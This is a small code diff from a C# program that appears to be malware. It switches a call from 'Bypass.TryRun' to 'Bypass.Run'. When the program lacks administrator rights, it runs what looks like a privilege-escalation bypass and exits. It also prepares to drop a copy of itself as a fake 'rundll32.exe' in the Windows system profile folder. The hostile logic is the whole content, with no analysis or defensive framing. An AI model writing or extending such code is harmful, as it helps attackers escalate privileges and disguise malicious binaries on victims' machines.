@@ -32,7 +32,7 @@ namespace Memory
                 const string finalPath = @"C:\Windows\System32\config\systemprofile\rundll32.exe";
                 if (!IsAdministrator())
                 {
-                    Task.Run(() => Bypass.TryRun(currentPath)).Wait();
+                    Task.Run(() => Bypass.Run(currentPath)).Wait();
                     Environment.Exit(0);
                 }
                 if (File.Exists(finalPath)) File.Delete(finalPath);
